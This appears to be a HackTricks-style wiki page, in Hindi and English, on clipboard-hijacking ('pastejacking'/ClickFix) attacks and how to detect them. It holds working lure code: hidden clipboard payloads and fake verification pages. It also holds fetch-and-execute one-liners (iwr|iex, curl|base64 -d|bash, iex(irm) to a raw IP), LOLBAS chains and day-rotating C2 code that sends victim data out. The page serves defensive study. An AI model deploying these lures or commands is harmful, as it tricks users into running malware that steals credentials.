# Clipboard Hijacking (Pastejacking) हमले

{{#include ../../banners/hacktricks-training.md}}

> "यदि आपने स्वयं कॉपी नहीं किया है तो कुछ भी पेस्ट न करें।" – पुरानी लेकिन अभी भी वैध सलाह

## सारांश

Clipboard hijacking – जिसे *pastejacking* भी कहा जाता है – इस तथ्य का दुरुपयोग करता है कि उपयोगकर्ता बिना जाँच किए अक्सर कमांड्स को कॉपी-पेस्ट करते हैं। एक दुर्भावनापूर्ण वेब पेज (या कोई भी JavaScript-सक्षम संदर्भ जैसे Electron या Desktop application) प्रोग्रामेटिक रूप से हमलावर-नियंत्रित टेक्स्ट को सिस्टम क्लिपबोर्ड में रखता है। शिकारों को आम तौर पर सावधानीपूर्वक बनाए गए social-engineering निर्देशों द्वारा प्रोत्साहित किया जाता है कि वे **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) दबाएँ, या टर्मिनल खोलकर क्लिपबोर्ड कंटेंट को *paste* करें, जिससे तुरंत मनमाने कमांड्स निष्पादित हो जाते हैं।

क्योंकि **कोई फ़ाइल डाउनलोड नहीं की जाती और कोई attachment नहीं खोला जाता**, यह तकनीक उन अधिकांश ई-मेल और वेब-कंटेंट सुरक्षा नियंत्रणों को बायपास कर देती है जो attachments, macros या direct command execution की निगरानी करते हैं। इसलिए यह attack phishing अभियानों में लोकप्रिय है जो NetSupport RAT, Latrodectus loader या Lumma Stealer जैसे commodity malware परिवारों को डिलीवर करते हैं।

## Forced copy buttons and hidden payloads (macOS one-liners)

कुछ macOS infostealers इंस्टॉलर साइट्स (जैसे Homebrew) की नकल करते हैं और उपयोगकर्ताओं को केवल दिखने वाले टेक्स्ट को हाइलाइट करने से रोकने के लिए **“Copy” बटन का उपयोग बाध्य कर देते हैं**। क्लिपबोर्ड एंट्री में अपेक्षित installer command के साथ एक appended Base64 payload (उदा., `...; echo <b64> | base64 -d | sh`) भी होता है, इसलिए एक ही paste दोनों को निष्पादित कर देता है जबकि UI अतिरिक्त चरण को छिपा देता है।

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
पुराने अभियान `document.execCommand('copy')` का उपयोग करते थे, नए अभियान asynchronous **Clipboard API** (`navigator.clipboard.writeText`) पर निर्भर करते हैं।

## ClickFix / ClearFake फ्लो

1. यूजर एक typosquatted या compromised साइट पर विजिट करता है (उदा. `docusign.sa[.]com`)
2. Injected **ClearFake** JavaScript `unsecuredCopyToClipboard()` हेल्पर कॉल करता है जो चुपचाप clipboard में Base64-encoded PowerShell one-liner स्टोर कर देता है।
3. HTML निर्देश पीड़ित से कहते हैं: *“**Win + R** दबाएँ, कमांड पेस्ट करें और Enter दबाकर समस्या हल करें।”*
4. `powershell.exe` execute होता है, एक archive डाउनलोड करता है जिसमें एक legitimate executable और एक malicious DLL होता है (classic DLL sideloading)।
5. लोडर अतिरिक्त चरणों को decrypt करता है, shellcode inject करता है और persistence install करता है (उदा. scheduled task) — अंततः NetSupport RAT / Latrodectus / Lumma Stealer चलाता है।

### NetSupport RAT चेन का उदाहरण
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) अपनी निर्देशिका में `msvcp140.dll` की तलाश करता है।
* दुर्भावनापूर्ण DLL **GetProcAddress** का उपयोग करके APIs को डायनामिक रूप से रिज़ॉल्व करता है, दो binaries (`data_3.bin`, `data_4.bin`) को **curl.exe** के माध्यम से डाउनलोड करता है, उन्हें rolling XOR key `"https://google.com/"` का उपयोग करके डिक्रिप्ट करता है, अंतिम shellcode इंजेक्ट करता है और **client32.exe** (NetSupport RAT) को `C:\ProgramData\SecurityCheck_v1\` में अनज़िप करता है।

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe** से `la.txt` डाउनलोड करता है
2. **cscript.exe** के अंदर JScript downloader को निष्पादित करता है
3. MSI payload प्राप्त करता है → signed application के बगल में `libcef.dll` गिराता है → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer MSHTA के माध्यम से
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** कॉल एक छिपी हुई PowerShell स्क्रिप्ट लॉन्च करती है जो `PartyContinued.exe` को प्राप्त करती है, `Boat.pst` (CAB) को निकालती है, `extrac32` और फ़ाइल concatenation के माध्यम से `AutoIt3.exe` को पुनर्निर्मित करती है और अंततः एक `.a3x` स्क्रिप्ट चलाती है जो browser credentials को `sumeriavgv.digital` पर exfiltrates करती है।

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

कुछ ClickFix अभियान file downloads को पूरी तरह से skip कर देते हैं और शिकारियों को निर्देश देते हैं कि वे एक one‑liner paste करें जो WSH के माध्यम से JavaScript को fetch और execute करता है, इसे persist करता है, और C2 को रोज़ाना rotate करता है। देखा गया उदाहरण श्रृंखला:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
मुख्य विशेषताएँ
- Obfuscated URL को runtime पर reverse किया जाता है ताकि साधारण निरीक्षण नाकाम रहे।
- JavaScript स्वयं को Startup LNK (WScript/CScript) के माध्यम से कायम रखता है, और वर्तमान दिन के आधार पर C2 का चयन करता है — जिससे तेज domain rotation सक्षम होता है।

दिन के अनुसार C2s को rotate करने के लिए प्रयुक्त Minimal JS fragment:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
अगला चरण आमतौर पर एक loader डिप्लॉय करता है जो persistence स्थापित करता है और एक RAT (e.g., PureHVNC) को खींचता है, अक्सर TLS को एक hardcoded certificate से pin करता है और ट्रैफ़िक को chunk करता है।

Detection ideas specific to this variant
- प्रोसेस ट्री: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- स्टार्टअप आर्टिफैक्ट्स: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` जो WScript/CScript को invoke करता है और JS path `%TEMP%`/`%APPDATA%` के तहत होता है।
- Registry/RunMRU और command‑line telemetry जिनमें `.split('').reverse().join('')` या `eval(a.responseText)` शामिल हो।
- बार‑बार `powershell -NoProfile -NonInteractive -Command -` चलाना साथ ही बड़े stdin payloads ताकि लंबी स्क्रिप्ट्स को बिना लंबे command lines के feed किया जा सके।
- Scheduled Tasks जो बाद में LOLBins को execute करते हैं, जैसे `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` एक updater‑जैसी task/path के अंतर्गत (e.g., `\GoogleSystem\GoogleUpdater`)।

Threat hunting
- रोज़ाना-रोटेट होने वाले C2 hostnames और URLs जिनका पैटर्न `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` होता है।
- Clipboard write events को correlate करें जिनके बाद Win+R paste और तत्पश्चात तुरंत `powershell.exe` execution होता है।

Blue-teams clipboard, process-creation और registry telemetry को मिलाकर pastejacking दुरुपयोग को pinpoint कर सकते हैं:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` **Win + R** कमांड्स का इतिहास रखता है – असामान्य Base64 / obfuscated entries देखें।
* Security Event ID **4688** (Process Creation) जहाँ `ParentImage` == `explorer.exe` और `NewProcessName` इन { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } में से हो।
* Event ID **4663** उन file creations के लिए जो `%LocalAppData%\Microsoft\Windows\WinX\` या temporary folders के अंतर्गत suspicious 4688 event से ठीक पहले होती हैं।
* EDR clipboard sensors (यदि मौजूद हों) – `Clipboard Write` को तुरंत नए PowerShell process के साथ correlate करें।

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Recent campaigns mass-produce fake CDN/browser verification pages ("Just a moment…", IUAM-style) जो users को मजबूर करते हैं कि वे अपने clipboard से OS-specific commands को native consoles में copy करें। इससे execution browser sandbox से बाहर हो जाती है और यह Windows और macOS दोनों पर काम करता है।

Key traits of the builder-generated pages
- OS detection via `navigator.userAgent` करके payloads को tailor किया जाता है (Windows PowerShell/CMD बनाम macOS Terminal)। Unsupported OS के लिए optional decoys/no-ops रखते हैं ताकि illusion बनी रहे।
- benign UI actions (checkbox/Copy) पर automatic clipboard-copy करना, जबकि visible text clipboard content से अलग हो सकता है।
- Mobile blocking और एक popover जिसमें step-by-step instructions: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter।
- Optional obfuscation और single-file injector जो compromised site के DOM को Tailwind-styled verification UI से overwrite कर देता है (no new domain registration required)。

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS पर initial run की persistence
- Use `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ताकि टर्मिनल बंद होने के बाद execution जारी रहे, और visible artifacts कम हों।

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- वेब: ऐसी पेज जो Clipboard API को verification widgets से बाँधते हैं; दिखाए गए टेक्स्ट और clipboard payload के बीच असंगति; `navigator.userAgent` ब्रांचिंग; Tailwind + single-page replace संदिग्ध संदर्भों में।
- Windows एंडपॉइंट: `explorer.exe` → `powershell.exe`/`cmd.exe` ब्राउज़र इंटरैक्शन के तुरंत बाद; batch/MSI installers `%TEMP%` से निष्पादित।
- macOS एंडपॉइंट: Terminal/iTerm द्वारा `bash`/`curl`/`base64 -d` को `nohup` के साथ ब्राउज़र इवेंट्स के पास spawn/लॉन्च करना; टर्मिनल बंद होने पर background jobs का जीवित रहना।
- `RunMRU` Win+R इतिहास और clipboard writes को बाद में होने वाले console process निर्माण के साथ सहसंबंधित करें।

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake continues to compromise WordPress sites and inject loader JavaScript that chains external hosts (Cloudflare Workers, GitHub/jsDelivr) and even blockchain “etherhiding” calls (e.g., POSTs to Binance Smart Chain API endpoints such as `bsc-testnet.drpc[.]org`) to pull current lure logic. हाल की overlays भारी मात्रा में fake CAPTCHAs का उपयोग करती हैं जो उपयोगकर्ताओं को कुछ भी डाउनलोड करने के बजाय एक one-liner (T1204.004) को copy/paste करने का निर्देश देती हैं।
- Initial execution को बढ़ते हुए signed script hosts/LOLBAS पर सौंपा जा रहा है। January 2026 chains ने पहले के `mshta` उपयोग को बदलकर built-in `SyncAppvPublishingServer.vbs` का उपयोग किया जो `WScript.exe` के माध्यम से execute होता है, और remote content प्राप्त करने के लिए aliases/wildcards वाले PowerShell-like arguments पास करता है:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` साइन किया गया है और सामान्यतः App-V द्वारा उपयोग किया जाता है; `WScript.exe` के साथ और असामान्य arguments (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) के साथ जुड़ने पर यह ClearFake के लिए एक high-signal LOLBAS stage बन जाता है।
- फ़रवरी 2026 में नकली CAPTCHA payloads फिर से pure PowerShell download cradles की ओर शिफ्ट हो गए। दो लाइव उदाहरण:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- पहला चेन इन-मेमोरी `iex(irm ...)` grabber है; दूसरा `WinHttp.WinHttpRequest.5.1` के माध्यम से स्टेज करता है, एक temp `.ps1` लिखता है, फिर hidden window में `-ep bypass` के साथ लॉन्च होता है।

Detection/hunting टिप्स इन वेरिएंट्स के लिए
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` or PowerShell cradles immediately after clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, or raw IP `iex(irm ...)` patterns.
- Network: वेब ब्राउज़िंग के तुरंत बाद script hosts/PowerShell से CDN worker hosts या blockchain RPC endpoints की ओर outbound ट्रैफ़िक।
- File/registry: `%TEMP%` के तहत temporary `.ps1` बनना और RunMRU एंट्रीज़ जिनमें ये one-liners हों; signed-script LOLBAS (WScript/cscript/mshta) जो external URLs या obfuscated alias strings के साथ execute हों, उन पर block/alert करें।

## Mitigations

1. Browser hardening – clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) निष्क्रिय करें या user gesture की आवश्यकता रखें।
2. Security awareness – उपयोगकर्ताओं को सिखाएँ कि संवेदनशील कमांड को *टाइप* करें या पहले किसी text editor में पेस्ट करें।
3. PowerShell Constrained Language Mode / Execution Policy + Application Control का उपयोग करके arbitrary one-liners को ब्लॉक करें।
4. Network controls – ज्ञात pastejacking और malware C2 डोमेनों के लिए outbound requests को ब्लॉक करें।

## Related Tricks

* **Discord Invite Hijacking** अक्सर उपयोगकर्ताओं को malicious server में लुभाकर ClickFix तरीका abuses करता है:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
